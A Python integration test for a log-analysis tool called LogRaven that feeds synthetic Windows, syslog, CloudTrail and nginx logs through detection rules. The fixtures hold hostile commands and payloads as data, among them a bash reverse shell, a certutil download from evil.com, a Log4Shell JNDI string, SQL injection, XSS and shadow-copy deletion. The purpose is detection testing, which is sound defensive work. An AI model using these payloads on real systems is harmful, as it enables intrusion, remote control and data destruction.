#!/usr/bin/env python3
"""
test_pipeline.py — LogRaven end-to-end pipeline test.

Runs parsers → rule engine → reports which rules fired and what events triggered them.

USAGE (from project root):
    cd backend
    .\\venv\\Scripts\\python.exe ..\\scripts\\test_pipeline.py
"""

from __future__ import annotations

import os
import sys
import json
import tempfile
from collections import defaultdict
from datetime import datetime, timedelta
from pathlib import Path

# ── Path setup ───────────────────────────────────────────────────────────────
BACKEND_DIR = Path(__file__).parent.parent / "backend"
sys.path.insert(0, str(BACKEND_DIR))

os.environ.setdefault("DATABASE_URL", "postgresql+asyncpg://x:x@localhost/x")
os.environ.setdefault("SECRET_KEY",   "test-secret-key-not-used-here")

# ── Colour helpers ────────────────────────────────────────────────────────────
_COLOURS = {
    "critical": "\033[91m",  # bright red
    "high":     "\033[93m",  # yellow
    "medium":   "\033[94m",  # blue
    "low":      "\033[96m",  # cyan
    "informational": "\033[90m",  # grey
    "deduplicated":  "\033[90m",
    "reset":    "\033[0m",
    "bold":     "\033[1m",
    "green":    "\033[92m",
    "header":   "\033[95m",  # magenta
}

def c(text: str, colour: str) -> str:
    return f"{_COLOURS.get(colour, '')}{text}{_COLOURS['reset']}"


# ═══════════════════════════════════════════════════════════════════════════════
# TEST DATA
# ═══════════════════════════════════════════════════════════════════════════════

# ── 1. Windows Event Log (CSV) ─────────────────────────────────────────────
#
# Intentional attack scenarios embedded:
#   - 10× EventID 4625 from 10.0.0.55  (SSH brute force → threshold rules)
#   - EventID 4698 with -EncodedCommand  (suspicious scheduled task)
#   - EventID 1102                       (security log cleared)
#   - EventID 4720                       (new user account)
#   - EventID 4732 to Administrators     (admin group add → critical)
#   - EventID 4672 with SeDebugPrivilege (credential dump risk)
#   - EventID 4624 LogonType=3, NTLM     (pass-the-hash)
#   - EventID 4688 powershell -enc       (encoded PS)
#   - EventID 4688 certutil -urlcache    (certutil LOLBin)
#   - EventID 4688 wmic shadowcopy del   (VSS destruction / ransomware)
#   - EventID 4688 net user /domain      (domain recon)
# ────────────────────────────────────────────────────────────────────────────
_BASE_TS = datetime(2025, 6, 15, 10, 0, 0)

def _ts(delta_seconds: int) -> str:
    return (_BASE_TS + timedelta(seconds=delta_seconds)).strftime("%Y-%m-%dT%H:%M:%S")

WINDOWS_CSV = (
    "EventID,TimeCreated,Computer,SubjectUserName,IpAddress,"
    "LogonType,AuthenticationPackageName,NewProcessName,CommandLine,"
    "ParentProcessName,PrivilegeList,GroupName,TaskName\n"
)
# 10× auth failures from 10.0.0.55 (brute force — within 60 s)
for i in range(10):
    WINDOWS_CSV += (
        f"4625,{_ts(i)},DC01.corp.local,Administrator,10.0.0.55,"
        f"3,Kerberos,,,,"
        f",,\n"
    )
# Pass the hash: type-3 NTLM logon
WINDOWS_CSV += f"4624,{_ts(70)},WKS01,jsmith,10.0.0.55,3,NTLM,,,,,,\n"
# RDP logon
WINDOWS_CSV += f"4624,{_ts(75)},WKS01,jsmith,10.0.1.22,10,Kerberos,,,,,,\n"
# Suspicious scheduled task with encoded command
WINDOWS_CSV += (
    f"4698,{_ts(90)},WKS01,jsmith,10.0.0.55,,,"
    f"C:\\Windows\\System32\\schtasks.exe,"
    f"schtasks /create /tn \\\"Updater\\\" /tr \\\"powershell -EncodedCommand SQBFAFgA\\\","
    f",,TaskContent=powershell -EncodedCommand SQBFAFgA,UpdaterTask\n"
)
# Security log cleared
WINDOWS_CSV += f"1102,{_ts(95)},DC01,SYSTEM,,,,,,,,,\n"
# New user account created
WINDOWS_CSV += f"4720,{_ts(100)},DC01,attacker_backdoor,10.0.0.55,,,,,,,\n,\n"
WINDOWS_CSV = WINDOWS_CSV.rstrip(",\n") + "\n"
# Strip extra newlines from above hack
WINDOWS_CSV = "\n".join([l for l in WINDOWS_CSV.splitlines() if l.strip()])
# User added to Administrators
WINDOWS_CSV += f"\n4732,{_ts(105)},DC01,attacker_backdoor,10.0.0.55,,,,,,,Administrators,\n"
# Special privilege (SeDebugPrivilege) assigned
WINDOWS_CSV += f"4672,{_ts(110)},WKS01,jsmith,,,,,,,,SeDebugPrivilege SeImpersonatePrivilege,,\n"
# Encoded PowerShell
WINDOWS_CSV += (
    f"4688,{_ts(120)},WKS01,jsmith,10.0.0.55,,,"
    f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"
    f"powershell.exe -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAA==,"
    f"C:\\Windows\\explorer.exe,,\n"
)
# Certutil LOLBin download
WINDOWS_CSV += (
    f"4688,{_ts(130)},WKS01,jsmith,10.0.0.55,,,"
    f"C:\\Windows\\System32\\certutil.exe,"
    f"certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe,"
    f"C:\\Windows\\System32\\cmd.exe,,\n"
)
# VSS shadow copy deletion (ransomware indicator)
WINDOWS_CSV += (
    f"4688,{_ts(140)},WKS01,jsmith,10.0.0.55,,,"
    f"C:\\Windows\\System32\\wbem\\wmic.exe,"
    f"wmic shadowcopy delete /nointeractive,"
    f"C:\\Windows\\System32\\cmd.exe,,\n"
)
# Domain recon via net command
WINDOWS_CSV += (
    f"4688,{_ts(150)},WKS01,jsmith,10.0.0.55,,,"
    f"C:\\Windows\\System32\\net.exe,"
    f"net user /domain,"
    f"C:\\Windows\\System32\\cmd.exe,,\n"
)
# Audit policy changed
WINDOWS_CSV += f"4719,{_ts(160)},DC01,SYSTEM,,,,,,,,,\n"
# Kerberoasting: 4769 RC4 ticket
WINDOWS_CSV += (
    f"4769,{_ts(170)},DC01,jsmith,10.0.0.55,,,,,,"
    f",,ServiceName=MSSQL/sqlsrv.corp.local\n"
)

# ── 2. Syslog (auth.log style) ─────────────────────────────────────────────
#
# Scenarios:
#   - 8× SSH failures from 192.168.1.200  (brute force)
#   - sudo -i (root shell)
#   - useradd backdoor
#   - session opened for root
#   - authorized_keys access
#   - reverse shell pattern
#   - /etc/passwd access
#   - SSH tunnel
# ────────────────────────────────────────────────────────────────────────────
_SYSLOG_LINES = []
# 8× SSH failures from same IP — brute force threshold (5/60s)
for i in range(8):
    sec = i * 5
    _SYSLOG_LINES.append(
        f"Jun 15 10:01:{sec:02d} webserver01 sshd[22345]: "
        f"Failed password for root from 192.168.1.200 port 5{sec:04d} ssh2"
    )
# Successful root login
_SYSLOG_LINES.append(
    "Jun 15 10:02:00 webserver01 sshd[22350]: "
    "Accepted password for root from 10.0.0.1 port 22 ssh2"
)
# PAM failure
_SYSLOG_LINES.append(
    "Jun 15 10:02:10 webserver01 sshd[22351]: "
    "PAM: Authentication failure for root from 192.168.1.200"
)
# sudo -i
_SYSLOG_LINES.append(
    "Jun 15 10:03:00 webserver01 sudo[22400]: "
    "jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash"
)
_SYSLOG_LINES.append(
    "Jun 15 10:03:05 webserver01 sudo[22401]: "
    "pam_unix(sudo:session): session opened for user root by jsmith(uid=1001)"
)
# Session for root
_SYSLOG_LINES.append(
    "Jun 15 10:03:10 webserver01 su[22402]: "
    "pam_unix(su:session): session opened for user root by jsmith(uid=1001)"
)
# useradd backdoor account
_SYSLOG_LINES.append(
    "Jun 15 10:04:00 webserver01 useradd[22450]: "
    "new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash"
)
# authorized_keys modified
_SYSLOG_LINES.append(
    "Jun 15 10:04:30 webserver01 sshd[22460]: "
    "Authentication attempt without prior check: ~/.ssh/authorized_keys"
)
# Reverse shell
_SYSLOG_LINES.append(
    "Jun 15 10:05:00 webserver01 bash[22500]: "
    "command: bash -i >& /dev/tcp/192.168.1.200/4444 0>&1"
)
# /etc/passwd access
_SYSLOG_LINES.append(
    "Jun 15 10:05:30 webserver01 passwd[22510]: "
    "pam_unix(passwd:chauthtok): password changed for /etc/passwd user backdoor"
)
# SSH tunnel
_SYSLOG_LINES.append(
    "Jun 15 10:06:00 webserver01 sshd[22520]: "
    "direct-tcpip: originator 192.168.1.200 port 12345 to 10.0.0.5 port 3389"
)
SYSLOG_CONTENT = "\n".join(_SYSLOG_LINES)

# ── 3. CloudTrail JSON ─────────────────────────────────────────────────────
#
# Scenarios:
#   - CreateUser (new IAM user)
#   - CreateAccessKey (new API key)
#   - AttachUserPolicy (admin policy)
#   - StopLogging (disable CloudTrail)
#   - GetSecretValue (secrets access)
#   - DeleteAlarms (silence monitoring)
#   - Root account activity
#   - GetSecretValue (SSM)
#   - AuthorizeSecurityGroupIngress (open SG)
#   - DeleteDetector (GuardDuty off)
#   - 12× API failures (brute force threshold)
# ────────────────────────────────────────────────────────────────────────────
_CT_BASE = "2025-06-15T10:00:0"
_CT_RECORDS = [
    {
        "eventTime":    _CT_BASE + "0Z",
        "eventName":    "CreateUser",
        "eventSource":  "iam.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
    },
    {
        "eventTime":    _CT_BASE + "1Z",
        "eventName":    "CreateAccessKey",
        "eventSource":  "iam.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"userName": "backdoor_user"},
    },
    {
        "eventTime":    _CT_BASE + "2Z",
        "eventName":    "AttachUserPolicy",
        "eventSource":  "iam.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"policyArn": "arn:aws:iam::aws:policy/AdministratorAccess", "userName": "backdoor_user"},
    },
    {
        "eventTime":    _CT_BASE + "3Z",
        "eventName":    "StopLogging",
        "eventSource":  "cloudtrail.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"name": "management-events"},
    },
    {
        "eventTime":    _CT_BASE + "4Z",
        "eventName":    "GetSecretValue",
        "eventSource":  "secretsmanager.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"secretId": "prod/database/password"},
    },
    {
        "eventTime":    _CT_BASE + "5Z",
        "eventName":    "DeleteAlarms",
        "eventSource":  "monitoring.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"alarmNames": ["SecurityAlarm", "BillingAlert"]},
    },
    {
        "eventTime":    _CT_BASE + "6Z",
        "eventName":    "ConsoleLogin",
        "eventSource":  "signin.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "root", "type": "Root", "arn": "arn:aws:iam::123456789012:root"},
    },
    {
        "eventTime":    _CT_BASE + "7Z",
        "eventName":    "AuthorizeSecurityGroupIngress",
        "eventSource":  "ec2.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"groupId": "sg-12345", "ipPermissions": {"cidrIp": "0.0.0.0/0", "fromPort": 0}},
    },
    {
        "eventTime":    _CT_BASE + "8Z",
        "eventName":    "DeleteDetector",
        "eventSource":  "guardduty.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"detectorId": "def012"},
    },
    {
        "eventTime":    _CT_BASE + "9Z",
        "eventName":    "PutBucketAcl",
        "eventSource":  "s3.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "userIdentity": {"userName": "attacker", "type": "IAMUser"},
        "requestParameters": {"bucketName": "prod-backups", "acl": "public-read-write", "AllUsers": True},
    },
]
# 12× API errors from same user — threshold rule
for i in range(12):
    _CT_RECORDS.append({
        "eventTime":    f"2025-06-15T10:01:{i:02d}Z",
        "eventName":    "DescribeInstances",
        "eventSource":  "ec2.amazonaws.com",
        "sourceIPAddress": "1.2.3.4",
        "errorCode":    "Client.UnauthorizedOperation",
        "errorMessage": "You are not authorized to perform this operation.",
        "userIdentity": {"userName": "scanner_user", "type": "IAMUser"},
    })
CLOUDTRAIL_JSON = json.dumps({"Records": _CT_RECORDS}, indent=2)

# ── 4. Nginx Access Log (Combined Log Format) ──────────────────────────────
#
# Scenarios:
#   - Normal requests (baseline)
#   - SQL injection (UNION SELECT)
#   - Path traversal (../)
#   - Admin panel access
#   - Log4Shell JNDI payload
#   - sqlmap user agent
#   - POST to .php file (webshell upload)
#   - Sensitive file access (.env, .git)
#   - XSS probe
#   - OS command injection
#   - 60× rapid 404s from same IP (directory brute-force threshold)
# ────────────────────────────────────────────────────────────────────────────
def _nginx(ip, ts_offset, method, path, status, size, ua="-", referer="-"):
    ts = (_BASE_TS + timedelta(seconds=ts_offset)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "{referer}" "{ua}"'

_NGINX_LINES = [
    _nginx("10.0.0.1", 0,   "GET",  "/",            200, 4096),
    _nginx("10.0.0.1", 1,   "GET",  "/index.html",  200, 2048),
    # SQL injection
    _nginx("5.5.5.5",  10,  "GET",  "/search?q=1'+UNION+SELECT+1,2,3--", 200, 100),
    # Path traversal
    _nginx("5.5.5.5",  11,  "GET",  "/files?name=../../../etc/passwd",    400, 50),
    # Admin panel
    _nginx("5.5.5.5",  12,  "GET",  "/admin",       403, 200),
    _nginx("5.5.5.5",  13,  "GET",  "/wp-admin/",   302, 100),
    # Log4Shell
    _nginx("5.5.5.5",  14,  "GET",  "/",            200, 100, ua="${jndi:ldap://evil.com/a}"),
    # sqlmap UA
    _nginx("5.5.5.5",  15,  "GET",  "/login",       200, 500, ua="sqlmap/1.7.8#stable"),
    # Webshell upload
    _nginx("5.5.5.5",  16,  "POST", "/upload/shell.php", 200, 50),
    # Sensitive file access
    _nginx("5.5.5.5",  17,  "GET",  "/.env",        200, 1024),
    _nginx("5.5.5.5",  18,  "GET",  "/.git/config", 200, 512),
    # XSS probe
    _nginx("5.5.5.5",  19,  "GET",  "/search?q=<script>alert(document.cookie)</script>", 200, 100),
    # OS command injection
    _nginx("5.5.5.5",  20,  "GET",  "/exec?cmd=;id;", 200, 100),
    # SSTI probe
    _nginx("5.5.5.5",  21,  "GET",  "/name?n={{7*7}}", 200, 100),
    # Spring4Shell
    _nginx("5.5.5.5",  22,  "GET",  "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", 200, 100),
    # HTTP OPTIONS
    _nginx("5.5.5.5",  23,  "OPTIONS", "/",         200, 100),
    # curl
    _nginx("5.5.5.5",  24,  "GET",  "/",            200, 100, ua="curl/7.88.1"),
]
# 60× rapid 404s from 9.9.9.9 (directory brute-force threshold)
for i in range(60):
    _NGINX_LINES.append(_nginx("9.9.9.9", i, "GET", f"/test{i}", 404, 50))

NGINX_LOG = "\n".join(_NGINX_LINES)


# ═══════════════════════════════════════════════════════════════════════════════
# PIPELINE RUNNER
# ═══════════════════════════════════════════════════════════════════════════════

def run_pipeline(parser_cls, content: str, suffix: str, source_type: str, label: str):
    """Write content to a temp file, parse it, run rule engine, return events."""
    tmp = tempfile.NamedTemporaryFile(
        mode="w", suffix=suffix, delete=False, encoding="utf-8"
    )
    tmp.write(content)
    tmp.close()

    try:
        events = parser_cls().parse(tmp.name)
        # Apply source_type override as the pipeline does
        for ev in events:
            ev.source_type = source_type
        return events
    finally:
        os.unlink(tmp.name)


def analyse_events(events: list, label: str) -> dict:
    """Run rule engine against events and return analysis dict."""
    from app.rules.engine import run_rules

    before_flags  = sum(1 for e in events if e.flags)
    events        = run_rules(events)
    after_flags   = sum(1 for e in events if e.flags)

    severity_counts: dict[str, int] = defaultdict(int)
    flag_counts:     dict[str, int] = defaultdict(int)
    flagged_events  = []

    for ev in events:
        severity_counts[ev.severity_hint] += 1
        for f in ev.flags:
            flag_counts[f] += 1
        if ev.flags:
            flagged_events.append(ev)

    return {
        "label":           label,
        "total":           len(events),
        "flags_before":    before_flags,
        "flags_after":     after_flags,
        "severity_counts": dict(severity_counts),
        "flag_counts":     dict(flag_counts),
        "flagged_events":  flagged_events,
    }


def print_result(r: dict) -> None:
    print()
    print(c("-" * 72, "header"))
    print(c(f"  {r['label']}", "bold"))
    print(c("-" * 72, "header"))
    print(f"  Events parsed    : {r['total']}")
    print(f"  Parser-flagged   : {r['flags_before']}")
    print(f"  After rule engine: {r['flags_after']}")

    # Severity breakdown
    sev_order = ["critical", "high", "medium", "low", "informational", "deduplicated"]
    sev_line = "  Severity         : " + "  ".join(
        c(f"{s[:3].upper()}={r['severity_counts'].get(s, 0)}", s)
        for s in sev_order
        if r["severity_counts"].get(s, 0) > 0
    )
    print(sev_line)

    # Flag breakdown
    if r["flag_counts"]:
        print()
        print(f"  {'Flag':<40} {'Count':>5}")
        print(f"  {'-'*40} {'-'*5}")
        for flag, count in sorted(r["flag_counts"].items(), key=lambda x: -x[1]):
            print(f"  {flag:<40} {count:>5}")

    # Individual flagged events
    if r["flagged_events"]:
        print()
        print(f"  {'EventID / Name':<25} {'Severity':<14} {'Flags'}")
        print(f"  {'-'*25} {'-'*14} {'-'*30}")
        for ev in r["flagged_events"]:
            eid   = (ev.event_id or "?")[:24].ljust(25)
            flags = ", ".join(ev.flags)[:60]
            sev   = ev.severity_hint
            sev_str = c(sev, sev)
            print(f"  {c(eid, sev)} {sev_str:<14} {flags}")


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    # Suppress noisy startup logs
    import logging
    logging.getLogger("lograven").setLevel(logging.WARNING)

    from app.rules.loader import get_rules
    from app.rules.schema import SimpleMatch, ThresholdMatch
    from app.parsers.windows_event import WindowsEventParser
    from app.parsers.syslog          import SyslogParser
    from app.parsers.cloudtrail      import CloudTrailParser
    from app.parsers.nginx           import NginxParser

    rules = get_rules()
    simple_count    = sum(1 for r in rules if isinstance(r.match, SimpleMatch))
    threshold_count = sum(1 for r in rules if isinstance(r.match, ThresholdMatch))

    print()
    print(c("=" * 72, "bold"))
    print(c("  LogRaven -- Rule Engine Integration Test", "bold"))
    print(c("=" * 72, "bold"))
    print(f"\n  YAML rules loaded : {c(str(len(rules)), 'green')} total")
    print(f"  Simple rules      : {simple_count}")
    print(f"  Threshold rules   : {threshold_count}")
    print(f"\n  Rule breakdown by log_type:")
    log_type_counts: dict[str, int] = defaultdict(int)
    for r in rules:
        lt = r.match.log_type or "any"
        log_type_counts[lt] += 1
    for lt, cnt in sorted(log_type_counts.items()):
        print(f"    {lt:<30} {cnt:>3} rules")

    # ── Parse and analyse ──────────────────────────────────────────────────
    tests = [
        (WindowsEventParser, WINDOWS_CSV,      ".csv",  "windows_endpoint", "Windows Event Log (CSV)"),
        (SyslogParser,       SYSLOG_CONTENT,   ".log",  "linux_endpoint",   "Linux auth.log / syslog"),
        (CloudTrailParser,   CLOUDTRAIL_JSON,  ".json", "cloudtrail",       "AWS CloudTrail"),
        (NginxParser,        NGINX_LOG,        ".log",  "web_server",       "Nginx Access Log"),
    ]

    results = []
    for parser_cls, content, suffix, source_type, label in tests:
        events = run_pipeline(parser_cls, content, suffix, source_type, label)
        r = analyse_events(events, label)
        results.append(r)
        print_result(r)

    # ── Grand total ────────────────────────────────────────────────────────
    print()
    print(c("=" * 72, "bold"))
    print(c("  GRAND TOTAL", "bold"))
    print(c("=" * 72, "bold"))
    total_events  = sum(r["total"]        for r in results)
    total_flagged = sum(r["flags_after"]  for r in results)
    all_flags: dict[str, int] = defaultdict(int)
    all_sev:   dict[str, int] = defaultdict(int)
    for r in results:
        for f, n in r["flag_counts"].items():
            all_flags[f] += n
        for s, n in r["severity_counts"].items():
            all_sev[s] += n

    print(f"\n  Total events parsed : {total_events}")
    print(f"  Events with flags   : {total_flagged}")
    print()
    sev_order = ["critical", "high", "medium", "low", "informational"]
    for s in sev_order:
        n = all_sev.get(s, 0)
        if n:
            label_str = c(f"{s.upper():<16}", s)
            print(f"  {label_str} {n:>3} events")
    print()
    print(f"  {'Flag':<40} {'Total':>5}")
    print(f"  {'-'*40} {'-'*5}")
    for flag, count in sorted(all_flags.items(), key=lambda x: -x[1]):
        print(f"  {flag:<40} {count:>5}")
    print()


if __name__ == "__main__":
    main()
